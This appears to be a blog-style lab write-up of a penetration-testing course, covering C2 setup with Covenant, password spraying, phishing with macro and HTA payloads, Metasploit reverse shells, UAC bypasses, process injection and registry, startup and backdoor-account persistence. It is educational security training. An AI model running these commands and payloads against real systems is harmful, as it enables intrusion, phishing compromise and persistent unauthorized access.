# My Journey in Server Management and Ethical Hacking

## Introduction
My journey in setting up and managing a Windows Server environment has been both challenging and rewarding. Here's a chronicle of my experiences, from installing Windows Server 2019 to exploring various functionalities like Active Directory and remote desktop setups. Join me in my journey of learning Movement, Pivoting and Persistence.

Movement, Pivoting and Persistence was a course on TCM Academy but has since been retired, this is a blog of my personal learning experience during that course. 

## Setting Up the Environment

### Installation
- **Windows Server 2019 and Workstations**: Successfully installed Windows Server 2019 (DC01) and two workstations, 01 and 02.

### Active Directory and Domain Services
- **Scripted Installation**: Utilized a script to install Windows Active Directory, domain services, and tools. This script also generated a forest for the domain controller (DC01) to sit in.

![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/24c5b259-551c-4b32-bc5f-4a011aa0a193)



### Domain Controller Setup
- **Initial Configuration**: Faced some initial hiccups with DNS errors and domain credentials, but managed to set up the initial domain controller effectively.

![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/e2130f8b-2ee2-4807-9bed-0f7be1e1de77)

- **Snapshot Creation**: Created a snapshot post-forest creation as a precautionary backup.

![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/a32c844f-f336-4c64-af28-1ffe04b36d96)
![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/e4d11cf3-06a1-4088-a3c4-9f9538bbed05)


- **Additional Configurations**: Promoted the mayor to domain and enterprise administrator, renamed the domain controller, created groups, and added users.

### Workstations Setup
- **Network Configuration and Domain Linking**: Linked Workstation1 and 2 to DC01, modifying network adapters and confirming connectivity.

I realized here that somehow I had Windows 10 Home Edition which does not allow you to connect to a domain. But I downloaded the correct Windows 10 Enterprise version and all was well! Both workstations were eventually added.

![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/d751c44b-1a30-4e13-823b-46518aadddf1)
![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/0e06e05d-837e-47aa-9fec-e74cfcfc5de2)
![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/38993e6d-5309-43c2-a41b-617fab29ea20)

I then located the shared folder and located the nameGen script to the desktop. The nameGen script will simply allow me to rename the two workstations. I then opened up PowerShell(Admin) and moved directories. 
![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/58c9a400-3410-4554-9f3e-d068ad728247)

From here I had to change the ExecutionPolicy to Unrestricted since this is a trusted script. 

![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/6d3770e1-6fb8-4d69-81d2-98ce569bc626)
![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/dc8c674f-f895-42ae-b1e3-b699d4580681)
![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/43cb6f4a-6b56-494e-b6ed-6a1efc7e5965)

## Setting up Ubuntu Mail

Here I changed the DNS address to 8.8.8.8 which is the Google DNS address. And then I had to turn "Wired" Off then On again for it to take effect.
![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/4f0d374c-f56a-433e-8d7d-e1650a82e353)

Opened Edge on Workstation-01 and went to our Ubuntu IP address:
![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/0cd9a19f-ecab-41f3-ba95-47573ad793d0)

Now it's time to Command and Control(C2)!

## How do you actually C2 though?
- Command and control platforms provide the two-way connectivity needed to interact with long-term environments under one umbrella
- Utilizing a tool such as Covenant or Metasploit, communications and instructions can be issued to multiple victim machines, and allow for native exploitation to occur.
- Both Covenant and Metasploit have native tools built in that allow for privilege escalation, changing processes, dumping hashes and more.

## Covenant
`wget https://dotnet.microsoft.com/download/dotnet/scripts/v1/dotnet-install.sh`
- `chmode +x dotnet-install.sh`
- `./dotnet-install.sh --channel 3.1`
- `git clone --recurse-submodules https://github.com/cobbr/Covenant`
- `cd Covenant/Covanent`
- `./dotnet/dotnet run`

I ran into a snag here where the ICU package was not installed:
![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/de156c72-c511-4a3b-a123-5a9e72ba3854)

After some troubleshooting, I fixed it with this command:
`export DOTNET_SYSTEM_GLOBALIZATION_INVARIANT=1`
`~/.dotnet/dotnet run (3.1)`
` dotnet run (6.0)`
![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/7f45f15b-6e43-4bb3-b7d1-2e9ac8f72d75)

Now it's Grunt Time!
Grunts are Covenant's C# implant and act pretty much like any grunt would act doing your bidding and acting out tasks you assign. There are different types:
- GruntHTTP - reverse powershell launcher
- GruntSMB - Communicate over SMB, very unstable
- Brute - Best for use on linux machines (cross-platform immplant built on .NET Core 3.1)

We will opt in for Net40 here as it opens up more machines to exploit. 
5 Seconds is the fasted delay that still remains stable. 

![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/80cda230-837c-4fbb-9259-e949058c2f46)
![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/cfd3ccdd-1a50-4d1e-9f62-e54c64cbadab)

![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/c9ab8b99-9762-407f-8254-37c33cc37c77)
- In the above picture we are hositng a PowerShell script that we can call from other machines later on.
- The Encoded Launcher script we can launch from PowerShell.

### Covenant - Session Zero Sessions vs. Greater than Zero Sessions

SessionID
- Windows differentiates between session 0 and session 1s
  - Session 0 is highly sensitive or isolated.
  - Windows uses a process sort of like virtual machines to run what these processes are and they don't want users to be able to run system level functions coming from these sessions.
 
Session Integrity
- System 0, System 1, High, Medium, Low
- Anything hidden might be higher than our current level of session integrity which is currently medium.
- It is possible to escalate our priviledges through a UAC bypass attack, we could get into a high integrity session or an Administrative session.
- There is also "winlogon" we can figure out if we can migrate or impersonate this process which we could do through Covenant/Metasploit.
![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/c5c97750-5abb-494d-8a11-d1efead0eb28)

## Website Enumeration & Wordlist Generation

My exploration of the mayorsec website's "About" section revealed numerous names, perfect for potential brute force or password spraying attacks. Here's a breakdown of my process:

- **Identifying Potential Usernames**: Carefully read through the "About" section of the mayorsec website and noted all the names listed.

- **Command Line Operations**: Opened up the command prompt to start processing these names.

![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/58d82b3c-213a-4b57-97ea-cfdb8009d5c4)


- **Generating Raw Name List**:
  - Executed `python3 namemash.py /root/Desktop/rawnames` to output a list of raw names.
  - The `rawnames` file contains the list of names I initially gathered from the website.

![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/58929657-37ec-4cce-9e75-b1433707c33c)


- **Creating a Username List**:
  - Now equipped with a potential list of usernames.
  - To determine the naming convention, I planned to attack the roundcube mail.

- **Generating Word List for Attack**:
  - Used `python3 namemash.py /root/Desktop/rawnames > /root/Desktop/combolist` to create a word list.
  - Navigated through directories and listed contents to ensure the word list (`combolist`) was correctly generated.

![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/78d45c11-fa0f-4fe4-9356-9681b762c18b)

This process was crucial in preparing for the subsequent steps of the security testing, specifically targeting the roundcube mail for further analysis.


### OWASP ZAP

My journey into security testing included the installation and use of OWASP ZAP on Kali, a free and open-source tool akin to Burp Suite Pro. Here's how I integrated and utilized it:

- **Installation and Setup**:
  - Installed OWASP ZAP on Kali Linux.
  - Required the installation of FoxyProxy on Firefox for proper functionality.

- **Configuring SSL Certificate**:
  - In ZAP, navigated to `Tools > Options > Dynamic SSL Certificate` and saved the certificate to the root.
  
![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/df21e2ac-abb9-488a-bf0d-a656c741e1b7)

  - On Firefox, searched for "certificate" in preferences and viewed the certificates.

![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/c29f902e-3343-48bb-b44d-b416101529ba)

  - Imported the ZAP certificate to Firefox for trusted website identification.

![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/88a4faa5-c2c7-41a5-add3-909751273aaa)
![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/6ccfde6f-4c58-4c95-b248-0641e93aa64b)

- **Setting Up Local Proxy**:
  - Adjusted ZAP's local proxy settings from 8080 to 8081 to avoid conflicts with Burp Suite.
    
![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/cdeeed30-5e26-4ac9-9709-a3c7551160eb)


- **Integrating FoxyProxy with ZAP**:
  - Configured FoxyProxy on Firefox with ZAP's proxy settings (IP: 127.0.0.1, Port: 8081) and enabled it while browsing.

![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/4543366f-360c-4cc5-89b7-f6923d7cadc9)
![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/3cac266d-c584-49e5-9fe1-196a673afe3b)


- **Testing with UbuntuMail VM**:
  - Accessed the UbuntuMail VM via Firefox and performed cleanup tasks, retaining only the necessary components like Roundcube.

![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/5a583957-d33f-462e-b92c-9c15301e9d6c)
![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/6cae08d4-9bf2-423d-af14-2e52fdc1160e)
![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/50ed09c5-0742-4c53-b8ff-591490619d3c)


- **Capturing and Analyzing Requests**:
  - Tested the Roundcube service by capturing and analyzing a POST request in ZAP.

![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/83e2b1e6-8438-4eb7-9f3c-026abe29b5b1)

  - Can attack and do Fuzz (much like the Intruder function with Burp Suite).
![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/3da5a70a-a63a-4110-86af-d6ca43363a0e)

Select Username(test) - Add - Add - Select File from drop down - Select button - Desktop - Combolist
![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/757d3da3-e535-4a90-87bb-985cc71c7e65)


- **Fuzz Testing**:
  - Conducted fuzz testing by adding the username "test" and the password "Summer2021!" from a pre-generated wordlist.
    
![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/bf9291d4-d4a3-4c35-8d6c-b04bd74ca89f)
![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/76ba55ff-fe62-4cc6-aafc-49774dcab1ca)

  - Successfully gained access, demonstrating the effectiveness of combining OWASP ZAP with manual enumeration for password spraying.

![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/15edbdb5-01d7-469e-bb1e-eb156d71a866)

This in-depth exploration with OWASP ZAP not only enhanced my understanding of vulnerability testing but also significantly improved my practical skills in conducting security assessments.


### Outward Email Phishing With Covenant

My exploration into the world of cybersecurity included conducting an outward email phishing campaign using Covenant. Here's a detailed walkthrough of the process:

- **Setting Up a New Listener in Covenant**:
  - Initiated by creating a new listener in Covenant+.

![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/4e0d9fc1-adf8-40af-ae2c-797e46e77c90)
![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/03cf5d7f-893d-4349-9296-9697fe5c2d9a)


- **Creating a PowerShell Launcher**:
  - Progressed to creating a new PowerShell Launcher in Covenant.

![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/787749a0-6a22-42f6-91fc-8f4e391b04fd)

  - Configured the launcher settings:
    - Set the listener to HTTP Listener.
    - Chose DotNetVersion as Net40.
    - Ensured the KillDate was set in the future.
    - Generated the launcher.

![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/e8de91da-b4bb-4085-a0b8-595da5f7aa51)

- **Hosting the PowerShell Script**:
  - In the Host tab, typed `/rev.ps1` and clicked the Host button.
  - Copied the EncodedLauncher script for later use.

![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/dd76e5e2-9fe9-4006-a764-02a5d95480f5)


- **Preparing the Phishing Document**:
  - Located the 'benefits' document and moved it to the file share.
  - Enabled content on the word document 'benefits' to activate the payload.

![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/c40a84e4-0945-4a59-9bb7-7b9ea2ed0633)
![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/ec4c7c3d-96ec-40d0-8579-ca079c0ddfe8)

- **Hosting the Document on a Listener**:
  - In Covenant, clicked on the HTTP listener and went to the Hosted Files tab.
  - Created an entry "/Benefits.doc" and selected the benefits.doc file from the desktop.
  - Checked on a web browser to ensure the document was correctly hosted and downloadable.

localhost./Benefits.doc

- **Completing the Phishing Email**:
  - Embedded the hyperlink to the hosted document within a RoundCube phishing email.
  - Upon clicking the link, no immediate action occurred within the document.
  - However, a successful shell opening was observed in Covenant, indicating the effectiveness of the phishing attack.

In this exercise, I successfully merged the elements of Covenant’s powerful capabilities with tactical phishing strategies, demonstrating a critical aspect of cybersecurity operations.


## HTA Extension File or HTML Application for Phishing Emails
![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/ad048358-9ac7-43e4-8449-9171dcd9ad85)


### Creating HTA for Phishing
- In Covenant, under Launchers and then Powershell:
  - Selected HTTP Listener with Net40.
  - Generated the required code.
  - Pasted the generated code into the "Powershell command here" section of an HTA file, named it `benefits.hta`.
- Hosted `Benefits.hta` on the HTTP Listener and verified its accessibility through a browser.

## HTA Email Phishing with Metasploit

![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/f5f7fcb6-37f5-48ad-94ff-e47d76f7709e)

### Metasploit Configuration
- On Metasploit, executed the following commands:
  - `use exploit/multi/handler`
  - `set payload windows/x64/meterpreter/reverse_tcp`
  - `set lhost eth0`
  - `set lport 443`
  - `exploit -j`

![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/0e4009ec-269b-4adc-9535-9e578cc92f2d)

- After running `sessions -K`, initiated `exploit -j`.
- On Kali, started a simple HTTP server using `python3 -m http.server 80`.
- On a Windows machine, checked the email and clicked the link from the phishing email.
- On Metasploit, observed the opening of a new meterpreter session.

### Meterpreter Session Handling
- Used `sessions` to see the new meterpreter session.
- Interacted with the session using `sessions -i 2` and checked user ID with `getuid`.

## Reports

### Password Spraying Finding
- **Description**: ABC Org's Roundcube E-Mail service had poor password policies, leading to account compromise via password spraying.
- **Remediation**: Suggested the implementation of strong password policies for the Roundcube E-Mail server, aligning with industry best practices.

### Email Phishing Finding
- **Description**: ABC Org experienced compromise of user workstations in the MayorSec domain due to successful email phishing, bypassing antivirus restrictions.
- **Remediation**: Recommended bi-annual training on identifying suspicious emails and attachments, along with implementing a Group Policy Object to prevent local users from disabling antivirus software.

## Local Enumeration with Covenant

- Accessed Covenant's local enumeration features at `localhost:7443/grunt`.
- Utilized `Seatbelt -group=all` for detailed information, though the process was heavy and slow.
- Gathered significant data on potential target processes and strategies to bypass antivirus mechanisms using `GetNetLocalGroup`.


# Local Enumeration with Metasploit

The process of local enumeration with Metasploit involved several steps, primarily centered around gathering network information and understanding the system's internal workings.

### Starting Metasploit and Creating a Reverse Shell
- Initiated Metasploit in Kali using the command `msfconsole`.
- Created a reverse shell and interacted with the session:
`msf6 exploit(multi/script/web_delivery) > sessions`
`msf6 exploit(multi/script/web_delivery) >sessions -i 5`

![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/968f41c9-00cd-4c13-85fd-a9cf57069087)

### Network Information Gathering
- Used various meterpreter commands to gather network information:
`meterpreter > ipconfig`
	- shows IP addresses of Interfaces
`meterpreter > arp`
	- see devices running on network 
`meterpreter > netstat -ano`
	-  lots are for VMs
`meterpreter > run post/windows/gather/enum_services`

![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/b65bff33-b45a-43d1-b458-256bb96753e8)

`meterpreter > run post/windows/gather/enum_applications`

![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/ce03caab-cdfe-4cbd-9a12-e8962a4d2daf)

# AutoLogon Misconfiguration and Exploitation

Exploring the AutoLogon feature in Windows, I demonstrated how misconfiguration can lead to security vulnerabilities, allowing user accounts to bypass the login screen using hardcoded credentials.

### Configuring AutoLogon in Windows
- Accessed the Registry Editor on Workstation 01 and navigated to the relevant keys:
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\Current Version

- Modified the `AutoAdminLogon` key and added new values for domain name, username, and password.

![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/b9be6dde-6703-45f6-bb19-8f28bdfcf092)

### PowerShell and Credential Enumeration
- Opened PowerShell and imported the code generated from Covenant's launcher.

![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/e97bd1da-f410-4970-99d9-42fc203bf0b4)
![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/8eeda8ad-59bb-4454-b4b7-ffbd5446ffba)


- Ran the `PowerUp.ps1` script to gather information about privilege escalation opportunities.

![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/a0b04efa-2a8f-49f7-997f-861749aaaf7f)

- Identified that the account is in the administrative group, suitable for a UAC attack.

- Searched the registry for hardcoded credentials using SharpUp and Seatbelt tools:
- 
![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/57354a84-edc0-4a36-8525-fb53dc0e3283)

This process highlighted the importance of proper configuration and the potential risks of hardcoded credentials in the system's registry.

# AlwaysInstallElevated

The AlwaysInstallElevated registry setting is a critical component for privilege escalation in lab environments and Capture The Flag (CTF) challenges. By configuring this, installation packages are installed with system privileges, which can be exploited for privilege escalation.

### Configuring Registry for AlwaysInstallElevated
- Accessed the Registry Editor and navigated to `HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Installer`.
- Changed the value from 0 to 1.
- Navigated to `HKEY_CURRENT_USER > Software > Policies > Microsoft`.
  - Created a new key named "Installer".
  - Inside the Installer key, added a new DWORD 32-bit value named "AlwaysInstallElevated" and changed its value from 0 to 1.

### Exploitation Process in Kali
- Generated a new PowerShell launcher in Kali.
- Used SharpUp to audit for privilege escalation opportunities, specifically looking for "HKLM" and "HKCU" under the "AlwaysInstallElevated Registry Keys".

![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/f0920219-ec6a-4906-a0b3-44a21a45b61b)

- Also performed enumeration using PowerShell:
  - Typed `PowerShellImport` in the blue screen interface, browsed for the "PowerUp.ps1" file, and executed it.
  - Ran `Powershell invoke-allchecks` to check for other privilege escalation opportunities.

### Creating and Executing Malicious Installer
- Utilized Msfvenom to create a new payload for a reverse shell.

![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/92f3362a-9f3d-4f64-9ae3-ace4ca296626)

- Grabbed the reverse shell code from Covenant and integrated it into the payload creation process.

![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/92e80c08-792a-41cb-a39b-8422895a9121)


- Checked the results of the "Powershell invoke-allchecks" command for additional insights.

![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/3afe62b7-4d77-47fd-a252-db9893c60867)

- Generated a new administrative user on the machine using the information obtained.

![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/1bf6dd7c-7087-4ae0-8af2-2d8cfa79ab7b)

- Verified the installation of the malicious installer:

![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/e7557be8-9022-4ce9-ab69-2dec58d79b60)

- Executed the malicious installer to obtain a reverse shell and an elevated callback as the system user.

![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/cac76fe1-1e46-42d6-880b-0ef133a1592f)
![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/15e1d4b8-b20e-4725-83b3-fa679c72ee6f)


This process demonstrated how the AlwaysInstallElevated setting could be exploited to gain elevated privileges on a target system.

# AlwaysInstallElevated Misconfiguration with Metasploit

In this segment, I explored how the AlwaysInstallElevated misconfiguration can be leveraged using Metasploit to gain elevated privileges on a target system.

### Using the Web Delivery Module in Metasploit
- Utilized Metasploit's web delivery module to generate a PowerShell script. This script was then executed in PowerShell on Workstation 01 to establish the initial shell.
- 
![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/2d07d1e8-1c15-4073-a644-bd17f77f1e86)
![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/867f9b59-761e-49a9-909e-62da07664a9e)

- Conducted checks for different service versions and potential patches.
- Identified numerous exploits that could be used to elevate privileges to the root user level.

![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/32c2f294-9ba3-4408-bbe3-8e30b779cf70)


### Managing Sessions in Metasploit
- Used Ctrl+Z to background the session in Metasploit (msf6).

![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/be1ebc01-ae8f-47a5-9ede-a40d04b41e90)

- Created and subsequently deleted a session to manage the Metasploit workflow effectively.

![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/0e123e5b-8c00-40ea-98b0-1ac9232cb5dd)
![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/57d00c69-4b65-43b8-acae-4a694a88ae7b)

### Targeting Specific Sessions
- Searched for specific sessions, particularly session 1, which is critical for further exploitation steps.
- Identified a session for WinLogon which is crucial for migration.

![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/97d59daa-944a-4a37-9ae8-5d0fac06a9cd)

- Successfully migrated to process 580 and monitored the progress on the workstation using `sysinfo`.

This exercise provided practical insights into leveraging Metasploit for exploiting misconfigurations and achieving privilege escalation on Windows systems.


# FodHelper UAC Bypass with Covenant

Leveraging the User Access Control (UAC) functionality in Windows, I escalated privileges from medium integrity of the `s.chisholm` account to high integrity, and ultimately gained system user access on Workstation 01.

### Utilizing FodHelper
- FodHelper, a trusted Windows binary, was used for the UAC bypass.
- In the Covenant blue screen interface, I used `PowerShellImport` to bring in necessary scripts.
- Located the `helper.ps1` file in the custom Kali build directory and executed a custom PowerShell command:

powershell helper -custom "cmd.exe /c powershell -Sta -Nop -Window Hidden -EncodedCommand [PowerShell Launcher Script]

![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/46cbdf3a-509a-4f02-b585-1a365b3b3e03)

- Checked for elevated privileges using the `ps` command in the blue interface:
  
![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/95615018-0454-4d58-bc28-96f24e3051ef)

### Injecting ShellCode with Covenant
- Accessed `Covenant > Launchers > ShellCode` to prepare for injection.

![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/e06e5beb-5175-4f26-9db2-48b9e49b5cd1)

- Downloaded and saved the ShellCode.
- Returned to the blue screen interface and typed `inject`.
- Entered the WinLogon process ID `580` in the prompt window to target the specific process.

![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/3f17f4e9-ebba-4f1c-9966-78cee329ec5c)

- Located the ShellCode on the desktop, executed it, and successfully injected it into the WinLogon process, showcasing its potential in penetration testing scenarios.
  
![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/d1416518-4eb1-4308-be14-670cd903868e)

# UAC Bypass with Metasploit 

Aiming to elevate privileges as `s.chisholm` and migrate from a session 0 process to a session 1 process for full machine control.

### Metasploit Configuration and Execution
- Started with the exploit `windows/local/bypassuac_dotnet_profiler` in Metasploit.

![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/a8edb5f2-d5fe-431a-90c1-ae038ae9507a)


- Identified potential exploits to achieve UAC bypass:

![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/47b4e78e-0120-47e0-9d65-824d3692d899)

- Set the session and executed the exploit:

msf6 exploit(windows/local/bypassuac_dotnet_profiler) > set session 1
msf6 exploit(windows/local/bypassuac_dotnet_profiler) > exploit -j
msf6 exploit(windows/local/bypassuac_dotnet_profiler) > sessions

- Further elevated privileges and interacted with session 4:
![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/851b5432-da0c-4b51-9baf-e405f94a9b94)

msf6 exploit(windows/local/bypassuac_dotnet_profiler) > sessions -i 4
![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/d2a90b64-1908-4d5c-890d-ff42faa9d03f)
![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/a05d0a00-4c5d-4709-aca2-a79daa8a96b9)

- Migrated to process 580 and verified the user ID:
meterpreter > migrate 580
meterpreter > getuid

![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/9a452dd2-1fef-4501-8a34-edfdea5d2640)

These steps demonstrated the effectiveness of UAC bypass techniques in both Covenant and Metasploit for achieving higher privileges on a target system.

# New User Persistence 

Creating a new user is a fundamental technique for ensuring domain persistence on a workstation. This involves interacting with accounts that have local administrative privileges.

![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/b4ead94c-1238-46e6-b3b5-518502314104)


### Creating a New User
- In the blue screen interface of Covenant, used the following command to add a new user:
shellcmd net users hacker Password123! /add

![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/a802a9cc-f5a5-4548-a1c1-3e560755a672)

- Verified the list of users to confirm the addition:
shell net users

![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/eec8e95c-e4fb-4346-acfe-48f5f1cb70fb)

### Adding User to Local Administrator Group
- Added the newly created user to the local administrator group for elevated privileges:
shell net localgroup administrators hacker /add

![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/2d921ce6-a07e-4034-bbb3-2021b99821d7)


# Startup Persistence

Leveraging the Startup vulnerability in Windows to create a persistence technique that calls back to us every time the victim machine is started and logged into.

### Implementing Startup Persistence
- Utilized the high integrity grunt in Covenant to inject a payload into startup tasks.
- Navigated to the Task tab and selected `PersistStartup`.

![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/b53a15b0-57ea-42ec-be9b-a2ee0f5c4596)

- Executed the task to load Covenant into the startup menu.
- 
![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/17185032-6c83-4683-bd27-76f12020244c)

- Observed that upon logging in as `s.chisholm` on Workstation 1, Covenant appeared in the Task Manager's startup list.
- 
![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/0f53ca50-23d3-497a-b2a2-8ea0c29fb41c)

- Noted the ability to disable and remove Covenant from the startup file directory as needed.

# Autorun Persistence

Using Covenant's Autorun Persistence technique to create a registry edit, ensuring a payload runs on Workstation 01 every time it restarts.

### Setting Up Autorun Persistence
- Interacted with the high integrity grunt and went to Launchers in Covenant.
- Configured a binary launcher with DotNetVersion set to Net40 and generated a payload.

![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/35ec7834-7b6d-4f14-94b3-1952b2e0fff7)
![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/d0f71815-74e8-464c-a537-d2415513e11a)

### Implementing Autorun Registry Edit
- Uploaded the payload before creating the Autorun task.
- Accessed the Covenant blue interface screen to manage the task.

![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/31400c14-f433-47b7-b3fe-f8aec7036c43)

- Created a new registry edit in `Computer/HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`.
![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/8de56c7e-208d-41ed-b2ff-0df7e013c92d)

![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/305c46ba-e82a-47f3-893f-b770e114543b)
![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/717b9ac9-fac1-4991-80b3-790ff07a7f88)
![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/4147915b-66e5-4097-87a3-255f1c369fa4)

- Confirmed the creation of the new registry key labeled "Updater".

![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/635db464-1df4-4c9a-a58e-eb89f50e321d)
![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/4928f0c0-92bf-4fa2-b837-87bd70c04a73)
![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/e7149562-51d5-4997-afef-f2779fb1417b)

- Restarted Workstation 01 and logged back in as `s.chisholm` to validate the persistence.

![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/f5114c04-e5b6-4890-871e-bca40c7159a8)

This process showcased the effective use of Covenant for creating persistent access on a target machine through various techniques.

# Session Passing to Metasploit, SOCKS, and the Autoroute Module

